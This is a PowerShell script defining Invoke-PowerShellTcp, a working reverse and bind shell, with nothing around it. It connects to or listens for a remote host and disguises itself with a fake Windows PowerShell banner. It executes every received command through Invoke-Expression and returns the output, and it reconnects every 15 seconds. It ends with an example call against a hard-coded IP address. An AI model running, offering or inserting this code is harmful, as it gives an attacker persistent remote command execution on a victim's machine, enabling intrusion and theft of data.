function Invoke-PowerShellTcp
{
    [CmdletBinding(DefaultParameterSetName="reverse")]
    Param(
        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind
    )

    while ($true)
    {
        $connected = $false
        try
        {
            if ($Reverse)
            {
                $client = New-Object System.Net.Sockets.TCPClient($IPAddress, $Port)
            }

            if ($Bind)
            {
                $listener = [System.Net.Sockets.TcpListener]$Port
                $listener.Start()
                $client = $listener.AcceptTcpClient()
            }

            $connected = $true
        }
        catch
        {
            Write-Warning "Connection attempt failed. Retrying in 15 seconds..."
            Start-Sleep -Seconds 15
        }

        if ($connected)
        {
            try
            {
                # Rest of your code for handling the connection
                $stream = $client.GetStream()
                [byte[]]$bytes = 0..65535|%{0}

                $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
                $stream.Write($sendbytes,0,$sendbytes.Length)

                $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
                $stream.Write($sendbytes,0,$sendbytes.Length)

                while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
                {
                    $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
                    $data = $EncodedText.GetString($bytes,0, $i)
                    try
                    {
                        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
                    }
                    catch
                    {
                        Write-Warning "Something went wrong with the execution of a command on the target."
                        Write-Error $_
                    }
                    $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
                    $x = ($error[0] | Out-String)
                    $error.clear()
                    $sendback2 = $sendback2 + $x

                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
                    $stream.Write($sendbyte,0,$sendbyte.Length)
                    $stream.Flush()
                }
            }
            catch
            {
                Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
                Write-Error $_
            }
            finally
            {
                $client.Close()
                if ($listener)
                {
                    $listener.Stop()
                }
            }

            # Add a delay before attempting to reconnect
            Start-Sleep -Seconds 15
        }
    }
}

# Example usage
Invoke-PowerShellTcp -Reverse -IPAddress 172.21.78.147 -Port 1
